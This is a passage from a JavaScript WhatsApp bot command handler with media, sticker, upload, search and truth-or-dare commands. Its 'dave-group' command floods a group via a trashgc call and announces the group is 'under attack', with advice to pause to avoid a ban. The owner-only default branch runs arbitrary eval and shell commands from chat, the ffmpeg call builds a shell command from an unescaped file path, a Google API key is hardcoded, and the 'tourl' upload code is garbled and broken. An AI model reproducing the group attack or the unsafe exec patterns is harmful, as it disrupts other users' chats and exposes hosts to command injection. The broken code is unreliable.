  //==================================================//   
  
          case 'tovn': {
  if (!/video/.test(mime) && !/audio/.test(mime))
    return m.reply(`Reply to a video/audio with caption ${prefix + command}`)
  if (!quoted)
    return reply(`Reply to a video/audio with caption ${prefix + command}`)
  var dl = await m.quoted.download()
  dave.sendMessage(from, { audio: dl, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
}
break

case 'toaudio': {
  if (!/video/.test(mime) && !/audio/.test(mime))
    return m.reply(`Reply to a video/audio with caption ${prefix + command}`)
  if (!quoted)
    return reply(`Reply to a video/audio with caption ${prefix + command}`)
  var dl = await m.quoted.download()
  dave.sendMessage(from, { audio: dl, mimetype: 'audio/mpeg', ptt: false }, { quoted: m })
}
break

case 'readmore':
case 'readall': {
  if (!q) return reply(`Enter text like ${command} youarebad|justkidding`)
  let [l, r] = text.split`|`
  if (!l) l = ''
  if (!r) r = ''
  reply(l + readmore + r)
}
break

case 'toimage':
case 'toimg': {
  if (!quoted) return reply('Reply to a sticker first!')
  if (!/webp/.test(mime))
    return reply(`Reply to a sticker with caption *${prefix + command}*`)
  let media = await dave.downloadAndSaveMediaMessage(quoted)
  let ran = await getRandom('.png')
  exec(`ffmpeg -i ${media} ${ran}`, (err) => {
    fs.unlinkSync(media)
    if (err) throw err
    let buffer = fs.readFileSync(ran)
    dave.sendMessage(m.chat, { image: buffer }, { quoted: m })
    fs.unlinkSync(ran)
  })
}
break

case 'stickerwm':
case 'wm':
case 'stikerwm':
case 'swm': {
  if (!text) return reply('Enter watermark text!')
  if (!/image|video/gi.test(mime)) return m.reply('Send media first')
  if (/video/gi.test(mime) && qmsg.seconds > 15)
    return m.reply('Video duration must be less than 15 seconds!')
  var image = await dave.downloadAndSaveMediaMessage(qmsg)
  await dave.sendImageAsSticker(m.chat, image, m, { packname: text })
  await fs.unlinkSync(image)
  dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break

case 'sticker':
case 'stiker':
case 's': {
  if (!/image|video/gi.test(mime)) return m.reply('Send media first')
  if (/video/gi.test(mime) && qmsg.seconds > 15)
    return m.reply('Video duration must be less than 15 seconds!')
  var image = await dave.downloadAndSaveMediaMessage(qmsg)
  await dave.sendImageAsSticker(m.chat, image, m, { packname: footer })
  await fs.unlinkSync(image)
  dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break

case 'smeme':
case 'stickermeme':
case 'stickmeme': {
  await dave.sendMessage(m.chat, { react: { text: '🚀', key: m.key } })
  if (!/webp/.test(mime) && /image/.test(mime)) {
    if (!text) return m.reply(`Usage: ${prefix + command} text1|text2`)
    let atas = text.split('|')[0] ? text.split('|')[0] : '-'
    let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
    let mee = await dave.downloadAndSaveMediaMessage(quoted)
    let mem = await UploadFileUgu(mee)
    let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
    await dave.sendImageAsSticker(m.chat, meme, m, {
      packname: global.packname,
      author: global.author
    })
  } else {
    m.reply(`Send/Reply an image with caption ${prefix + command} text1|text2`)
  }
}
break

case 'url': {
  if (!/image/.test(mime)) return reply('Send or reply to an image first')
  let media = await dave.downloadAndSaveMediaMessage(qmsg)
  const { ImageUploadService } = require('node-upload-images')
  const service = new ImageUploadService('pixhost.to')
  let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'dave.png')
  await dave.sendMessage(m.chat, { text: directLink.toString() }, { quoted: m })
  await fs.unlinkSync(media)
}
break

case 'tourl2': {
  if (!mime)
    return reply(`Send/Reply Video/Image with caption ${prefix + command}`)
  try {
    let media = await dave.downloadAndSaveMediaMessage(quoted)
    if (/image|video/.test(mime)) {
      let response = await CatBox(media)
      let fileSize = (fs.statSync(media).size / 1024).toFixed(2)
      let uploadDate = new Date().toLocaleString()
      let uploader = m.pushName
      let caption = `🔗 *Media Link:* ${response}\n📅 *Upload Date:* ${uploadDate}\n📂 *File Size:* ${fileSize} KB\n👤 *Uploader:* ${uploader}`
      reply(caption)
    } else {
      let response = await CatBox(media)
      reply(response)
    }
    await fs.unlinkSync(media)
  } catch (err) {
    console.log(err)
    reply('❌ Error while uploading media. Please try again.')
  }
}
break

case 'hdvideo':
case 'hdvid': {
  const ffmpeg = require('fluent-ffmpeg')
  const ffmpegStatic = require('ffmpeg-static')
  const { writeFile, unlink, mkdir } = require('fs').promises
  const { existsSync } = require('fs')
  const path = require('path')

  if (!ffmpegStatic) {
    return dave.sendMessage(m.chat, { text: '❌ FFMPEG not found!' }, { quoted: m })
  }
  ffmpeg.setFfmpegPath(ffmpegStatic)
  let inputPath, outputPath
  try {
    let q = m.quoted || m
    let mime = q.mimetype || q.msg?.mimetype || q.mediaType || ''
    if (!mime) return dave.sendMessage(m.chat, { text: 'Where is the video?' }, { quoted: m })
    if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
      return dave.sendMessage(m.chat, { text: `❌ Format ${mime} not supported!` }, { quoted: m })
    }
    dave.sendMessage(m.chat, { text: '⏳ Processing video, please wait 2-4 minutes...' }, { quoted: m })
    let videoBuffer = await q.download?.()
    if (!videoBuffer) return dave.sendMessage(m.chat, { text: '❌ Failed to download video!' }, { quoted: m })
    let tempDir = path.join(__dirname, 'tmp')
    if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true })
    inputPath = path.join(tempDir, `input_${Date.now()}.mp4`)
    outputPath = path.join(tempDir, `output_${Date.now()}.mp4`)
    await writeFile(inputPath, videoBuffer)
    await new Promise((resolve, reject) => {
      ffmpeg(inputPath)
        .outputOptions([
          '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
          '-r', '60',
          '-preset', 'faster',
          '-crf', '25',
          '-c:v', 'libx264',
          '-pix_fmt', 'yuv420p',
          '-c:a', 'aac',
          '-b:a', '128k'
        ])
        .on('end', resolve)
        .on('error', reject)
        .save(outputPath)
    })
    await dave.sendMessage(m.chat, {
      video: { url: outputPath },
      caption: 'Video quality enhanced successfully!'
    }, { quoted: m })
  } catch (err) {
    console.error('Error HD Video:', err)
    dave.sendMessage(m.chat, { text: 'Failed to enhance video quality.' }, { quoted: m })
  } finally {
    setTimeout(() => {
      if (inputPath) unlink(inputPath).catch(() => {})
      if (outputPath) unlink(outputPath).catch(() => {})
    }, 5000)
  }
}
break

case 'hd':
case 'tohd':
case 'remini': {
  if (!quoted) return reply('Where is the photo?')
  if (!/image/.test(mime)) return reply(`Send/Reply to a photo with caption ${prefix + command}`)
  await dave.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })

  await reply('Please wait, your process has started...\n\n⏳ This may take some time, please be patient.')

  let cap = `*Type:* SuperHD\n*Result:* Success`
  let media = await dave.downloadAndSaveMediaMessage(quoted)
  try {
    let catBoxUrl = await CatBox(media)
    let anjai = await fetchJson(`https://api.vreden.my.id/api/artificial/hdr?url=${catBoxUrl}&pixel=4`)
    let result = anjai.result.data.downloadUrls[0]
    dave.sendMessage(m.chat, { image: { url: result }, caption: cap }, { quoted: m })
  } catch (error) {
    console.error(error)
    reply('❌ Error processing HD image.')
  }
}
break

    
        case "tourl": { 
  // Check if the message is a quoted image
  if (!m.quoted) return reply("❌ Reply to the image with /tourlpub");

  // Download the quoted image
  let q = await m.quoted.download();
  if (!q) return reply("❌ Failed to download");

  // Create a new FormData object and append the image
  const FormData = require("form-data"),
    axios = require("axios"),
    form = new FormData();
  form.append("key", "LutBotz.Tamvan.dan.ganteng.banget.sumpah");
  form.append("file", q, { filename: "wa.png", contentType: "image/png" });

  // Send a POST request to the upload URL
  const r = await axios.post("https:")                                                                                      
  const z = r.data;

                                       
  if (!z.success) return reply("//rismajaya.my.id/tools/uploaders/uploads.php", form, { headers: form.getHeaders() });
  const d = r.data;

  // Check if the upload was successful
  if (!d.success) return reply("❌ " + d.error);

  // Send the public link
  await reply(`𝘿𝙖𝙫𝙚𝘼𝙄 urls\n\n${d.url}`);
}
break;



// 🔍 Anime Search
case 'animesearch': {
  if (!text) return m.reply(`Example usage: ${prefix + command} Solo Leveling`);

  try {
    // Show loading message
    await m.reply('🔍 Searching for anime...');

    // Fetch from API
    const apiUrl = `https://flowfalcon.dpdns.org/anime/search?q=${encodeURIComponent(text)}`;
    const { data } = await axios.get(apiUrl);

    if (!data.status || !data.result || data.result.length === 0) {
      return m.reply('No results found for that anime.');
    }

    // Format search results
    let replyText = `🎌 *Anime Search Results* 🎌\n\n`;
    data.result.forEach((anime, index) => {
      replyText += `*${index + 1}. ${anime.title}*\n`;
      replyText += `├ Type: ${anime.type || 'Unknown'}\n`;
      replyText += `├ Status: ${anime.status || 'Unknown'}\n`;
      replyText += `└ Link: ${anime.link}\n\n`;
    });

    // Send the first result with image
    const firstResult = data.result[0];
    await dave.sendMessage(
      m.chat,
      { image: { url: firstResult.image }, caption: replyText },
      { quoted: m }
    );

  } catch (error) {
    console.error('Error searching anime:', error);
    m.reply('Failed to search for anime. Please try again later.');
  }
}
break;


// 🛒 Play Store Search
case 'playstore':
case 'pstore': {
  if (!text) return m.reply(`Example: ${command} WhatsApp`);
  try {
    let response = await fetchJson(`https://api.vreden.web.id/api/playstore?query=${text}`);
    let results = response.result;

    if (!results.length) return m.reply('No results found.');

    let image = results[0]?.img;
    let textResult = results
      .map((item, i) => {
        return `*${i + 1}. ${item.title.toUpperCase()}*
Developer: ${item.developer}
Rating: ${item.rate2}
Link: ${item.link}
Developer Link: ${item.link_dev}`;
      })
      .join('\n\n');

    await dave.sendMessage(
      m.chat,
      { image: { url: image }, caption: textResult },
      { quoted: m }
    );
  } catch (err) {
    console.error(err);
    m.reply(err.toString());
  }
}
break;


// 🎮 PlayStation Search
case 'playstation':
case 'pstation': {
  if (!text) return m.reply(`Example: ${command} Naruto`);
  try {
    let response = await fetchJson(`https://fastrestapis.fasturl.cloud/search/playstation?query=${text}`);
    let image = response.result.images;
    let textResult = response.result
      .map((item, i) => {
        return `*${i + 1}. ${item.title.toUpperCase()}*\nLink: ${item.link}`;
      })
      .join('\n\n');

    await dave.sendMessage(
      m.chat,
      { image: { url: image }, caption: textResult },
      { quoted: m }
    );
  } catch (err) {
    console.error(err);
    m.reply(err.toString());
  }
}
break;


// 🌐 Google Search
case 'google': {
  if (!text) return m.reply(`Example: ${command} Dave`);
  const apiKey = 'AIzaSyAajE2Y-Kgl8bjPyFvHQ-PgRUSMWgBEsSk';
  const cx = 'e5c2be9c3f94c4bbb';
  const query = text;
  const url = `https://www.googleapis.com/customsearch/v1?q=${query}&key=${apiKey}&cx=${cx}`;

  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.items && data.items.length > 0) {
        let textResult = `🔎 *Google Search Results for:* ${text}\n\n`;
        data.items.forEach(item => {
          textResult += `• *Title:* ${item.title}\n`;
          textResult += `• *Description:* ${item.snippet}\n`;
          textResult += `• *Link:* ${item.link}\n\n`;
        });
        m.reply(textResult);
      } else {
        m.reply('No results found.');
      }
    })
    .catch(err => {
      m.reply('An error occurred while performing the search.');
    });
}
break;

//==================================================//   
        case 'ytmp4': {
  const axios = require('axios');
  const input = text?.trim();
  if (!input) return reply(`play:\n.ytmp4 https://youtu.be/xxxx,720\n\nList for results:\n- 360\n- 480\n- 720\n- 1080`);
  const [url, q = '720'] = input.split(',').map(a => a.trim());
  const validUrl = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\//.test(url);
  if (!validUrl) return reply(`❌ URL YouTube is not valid!`);
  const qualityMap = {
    "360": 360,
    "480": 480,
    "720": 720,
    "1080": 1080
  };

  if (!qualityMap[q]) {
    return reply(`❌ Quality must be valid!\nexample: 360, 720, 1080`);
  }
  const quality = qualityMap[q];
  const sendResult = async (meta) => {
    await dave.sendMessage(m.chat, {
      image: { url: meta.image },
      caption: `✅ *Title:* ${meta.title}\n📥 *Type:* MP4\n🎚️ *Quality:* ${meta.quality}p\n\nSending  file...`,
    }, { quoted: m });
    await dave.sendMessage(m.chat, {
      document: { url: meta.downloadUrl },
      mimetype: 'video/mp4',
      fileName: `${meta.title}.mp4`
    }, { quoted: m });
  };

  try {
    const { data: start } = await axios.get(
      `https://p.oceansaver.in/ajax/download.php?button=1&start=1&end=1&format=${quality}&iframe_source=https://allinonetools.com/&url=${encodeURIComponent(url)}`,
      {
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    if (!start.progress_url) return m.reply(`❌ failed to start progress`);
    let progressUrl = start.progress_url;
    let meta = {
      image: start.info?.image || "https://telegra.ph/file/fd0028db8c3fc25d85726.jpg",
      title: start.info?.title || "Unknown Title",
      downloadUrl: "",
      quality: q,
      type: "mp4"
    };
    let polling, attempts = 0;
    const maxTry = 40;
    reply('⏳ processing video...');
    do {
      if (attempts >= maxTry) return reply(`❌ Timeout process!`);
      await new Promise(r => setTimeout(r, 3000));
      try {
        const { data } = await axios.get(progressUrl, {
          timeout: 15000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
          }
        });
        polling = data;
        if (polling.progress < 100) console.log(`Progress: ${polling.progress}%`);
      } catch (e) {
        console.log(`Polling ${attempts + 1} gagal`);
      }
      attempts++;
    } while (!polling?.download_url);
    if (!polling.download_url) return reply(`❌ failed to get download from the link`);
    meta.downloadUrl = polling.download_url;
    return await sendResult(meta);
  } catch (e) {
    console.error(e);
    return reply(`❌ error has occurred: ${e.message || 'err'}`);
  }
}
break
//==================================================//           
        case 'dave-group': {
    if (!daveshown) return reply("This Feature Only Send By Bot Number");
if (!m.isGroup) return reply(mess.group)
    dave.sendMessage(m.chat, { react: { text: '🆘', key: m.key } });
    
    //Paramater
    for (let r = 0; r < 15; r++) {
        
 await trashgc(m.chat);
await trashgc(m.chat);
await trashgc(m.chat);
await trashgc(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
            reply(`[ 🔥 ] Group is under attack now
 _*\`Status\`*_ : *SUCCESS  ATTACK 鉁�*
 _*\`Type\`*_ : _${command}_
> pause for five-ten minutes to avoid ban

`)   
}
break;
//==================================================//     
        case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
dave.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
//==================================================//         
        case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
dave.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
//==================================================//   
        case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return reply(`Example : ${prefix+command} Trash corr`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
dave.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//==================================================//        
        case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              dave.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
//==================================================//          
        case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              dave.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
//━━━━━━━━━━━━━━━━━━━━━━━━//
default:
if (budy.startsWith('=>')) {
if (!daveshown) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!daveshown) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!daveshown) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
  let error = err.stack || err.message || util.format(err);
  console.log('====== ERROR REPORT ======');
  console.log(error);
  console.log('==========================');

  await dave.sendMessage(`${error}@s.whatsapp.net`, {
    text: `⚠️ *ERROR!*\n\n📌 *Message:* ${err.message || '-'}\n📂 *Stack Trace:*\n${error}`,
    contextInfo: { forwardingScore: 9999999, isForwarded: true }
  }, { quoted: m });
}
}
//━━━━━━━━━━━━━━━━━━━━━━━━//
// File Update
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update File 📁 : ${__filename}`)
delete require.cache[file]
require(file)
})
